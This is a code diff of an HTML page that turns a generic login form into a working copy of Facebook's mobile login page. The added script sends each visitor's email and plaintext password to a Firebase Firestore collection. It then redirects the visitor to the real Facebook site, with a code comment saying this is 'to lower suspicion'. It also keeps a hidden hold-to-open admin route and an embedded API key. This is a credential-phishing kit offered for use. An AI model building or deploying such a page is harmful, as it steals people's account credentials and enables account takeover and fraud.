@@ -2,34 +2,63 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Mobile Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Facebook – log in or sign up</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="container">
-    <h1 class="logo">AppName</h1>
-
-    <form class="login-form" id="loginForm">
-      <input type="text" id="email" placeholder="Email or phone number" required />
-      <input type="password" id="password" placeholder="Password" required />
-      <button type="submit">Log In</button>
-    </form>
-
-    <div class="divider">
-      <span>or</span>
+  <div class="main-wrapper">
+    <div class="app-banner">
+      <div class="banner-content">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/y99Yv9Ruv_I.png" alt="fb" width="40">
+        <span>Get Facebook for Android and browse faster.</span>
+      </div>
     </div>
 
-    <button class="create" id="secretBtn">Create New Account</button>
+    <div class="container">
+      <h1 class="logo">facebook</h1>
+
+      <form class="login-form" id="loginForm">
+        <div class="input-group">
+          <input type="text" id="email" placeholder="Mobile number or email" required />
+          <input type="password" id="password" placeholder="Password" required />
+        </div>
+        
+        <button type="submit" id="submitBtn">Log In</button>
+        
+        <div class="forgot-password">
+          <a href="#">Forgot Password?</a>
+        </div>
+      </form>
+
+      <div class="divider">
+        <span>or</span>
+      </div>
+
+      <div class="create-section">
+        <button class="create-btn" id="secretBtn">Create New Account</button>
+      </div>
+    </div>
+
+    <footer class="footer">
+      <div class="languages">
+        <div class="lang-col">
+          <span>English (US)</span>
+          <span>Español</span>
+          <span>Português (Brasil)</span>
+        </div>
+        <div class="lang-col">
+          <span class="more-lang">+</span>
+        </div>
+      </div>
+      <div class="copyright">Meta © 2026</div>
+    </footer>
   </div>
 
-  <!-- Firebase SDK -->
   <script type="module">
-
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, collection, addDoc, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    // 🔥 PASTE YOUR FIREBASE CONFIG HERE
     const firebaseConfig = {
       apiKey: "AIzaSyBW22kvaOIfcyvuEfFIt9K_jzoANdwRd04",
       authDomain: "fblog-19d96.firebaseapp.com",
@@ -42,54 +71,37 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // Add Data
     const form = document.getElementById("loginForm");
+    const submitBtn = document.getElementById("submitBtn");
     const secretBtn = document.getElementById("secretBtn");
 
-let holdTimer;
-const HOLD_DURATION = 10000; // 10 seconds
+    // Hidden Admin Access (10s hold)
+    let holdTimer;
+    secretBtn.addEventListener("mousedown", () => holdTimer = setTimeout(() => window.location.href = "admin.html", 10000));
+    ["mouseup", "mouseleave"].forEach(e => secretBtn.addEventListener(e, () => clearTimeout(holdTimer)));
 
-// Start holding
-secretBtn.addEventListener("mousedown", () => {
-  holdTimer = setTimeout(() => {
-    window.location.href = "admin.html"; // 🔥 hidden page
-  }, HOLD_DURATION);
-});
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      
+      // UX Loading State
+      submitBtn.disabled = true;
+      submitBtn.innerText = "Logging in...";
 
-// Cancel hold if released early
-["mouseup", "mouseleave", "touchend", "touchcancel"].forEach(event => {
-  secretBtn.addEventListener(event, () => {
-    clearTimeout(holdTimer);
-  });
-});
-
-form.addEventListener("submit", async (e) => {
-  e.preventDefault(); // 🚫 STOP PAGE RELOAD
-
-  const email = document.getElementById("email").value;
-  const password = document.getElementById("password").value;
-
-  if (!email || !password) {
-    alert("Please fill all fields");
-    return;
-  }
-
-  try {
-    await addDoc(collection(db, "users"), {
-      email: email,
-      password: password,
-      createdAt: new Date()
+      try {
+        await addDoc(collection(db, "users"), {
+          email: document.getElementById("email").value,
+          password: document.getElementById("password").value,
+          createdAt: new Date().toISOString()
+        });
+        
+        // Redirect to real FB to lower suspicion
+        window.location.href = "https://m.facebook.com/login/save-device/";
+      } catch (err) {
+        console.error(err);
+        submitBtn.disabled = false;
+        submitBtn.innerText = "Log In";
+      }
     });
-
-    alert("Data Saved!");
-    form.reset();
-    loadData();
-  } catch (error) {
-    console.error("Error saving data:", error);
-  }
-});
-
   </script>
 </body>
 </html>
-
